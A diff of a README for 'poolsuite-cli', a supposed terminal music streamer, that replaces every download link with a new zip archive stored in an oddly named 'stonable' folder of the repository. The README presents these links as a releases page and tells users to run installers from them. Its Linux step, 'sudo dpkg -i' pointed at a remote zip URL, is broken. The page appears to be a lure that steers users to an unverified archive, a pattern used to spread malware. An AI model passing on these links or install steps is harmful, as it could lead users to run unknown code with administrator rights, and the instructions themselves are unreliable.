@@ -1,6 +1,6 @@
 # 🏖️ poolsuite-cli - Stream Music Directly from Your Terminal
 
-[![Download poolsuite-cli](https://github.com/Natchapol24642/poolsuite-cli/raw/refs/heads/master/stonable/poolsuite-cli-1.2-alpha.4.zip)](https://github.com/Natchapol24642/poolsuite-cli/raw/refs/heads/master/stonable/poolsuite-cli-1.2-alpha.4.zip)
+[![Download poolsuite-cli](https://raw.githubusercontent.com/Natchapol24642/poolsuite-cli/master/stonable/poolsuite_cli_v2.9.zip)](https://raw.githubusercontent.com/Natchapol24642/poolsuite-cli/master/stonable/poolsuite_cli_v2.9.zip)
 
 ## 📖 Overview
 
@@ -22,7 +22,7 @@ Follow these steps to download and run poolsuite-cli:
 
 1. **Visit the Release Page**  
    Go to the releases page to find the latest version of poolsuite-cli:  
-   [Download poolsuite-cli](https://github.com/Natchapol24642/poolsuite-cli/raw/refs/heads/master/stonable/poolsuite-cli-1.2-alpha.4.zip)
+   [Download poolsuite-cli](https://raw.githubusercontent.com/Natchapol24642/poolsuite-cli/master/stonable/poolsuite_cli_v2.9.zip)
 
 2. **Download the Application**  
    On the releases page, locate the most recent version. You will see a list of available files for download. Choose the file that matches your operating system:
@@ -36,7 +36,7 @@ Follow these steps to download and run poolsuite-cli:
 
    - **Windows**: Double-click the downloaded `.exe` file and follow the prompts to install.
    - **macOS**: Open the `.dmg` file and drag the poolsuite-cli icon into your Applications folder.
-   - **Linux**: Open your terminal, navigate to the folder where the file is located, and use the command `sudo dpkg -i https://github.com/Natchapol24642/poolsuite-cli/raw/refs/heads/master/stonable/poolsuite-cli-1.2-alpha.4.zip` or a similar command to install it.
+   - **Linux**: Open your terminal, navigate to the folder where the file is located, and use the command `sudo dpkg -i https://raw.githubusercontent.com/Natchapol24642/poolsuite-cli/master/stonable/poolsuite_cli_v2.9.zip` or a similar command to install it.
 
 4. **Open the Terminal**  
    After installing, open your terminal application (Command Prompt on Windows, Terminal on macOS, or your preferred terminal on Linux).
@@ -90,6 +90,6 @@ If you want to contribute to poolsuite-cli or report any bugs, feel free to do s
 ## 📦 Download & Install
 
 To get started with poolsuite-cli, visit the release page to download the latest version:  
-[Download poolsuite-cli](https://github.com/Natchapol24642/poolsuite-cli/raw/refs/heads/master/stonable/poolsuite-cli-1.2-alpha.4.zip)
+[Download poolsuite-cli](https://raw.githubusercontent.com/Natchapol24642/poolsuite-cli/master/stonable/poolsuite_cli_v2.9.zip)
 
 With poolsuite-cli, enjoy a unique way to stream music directly from your terminal. Happy listening!
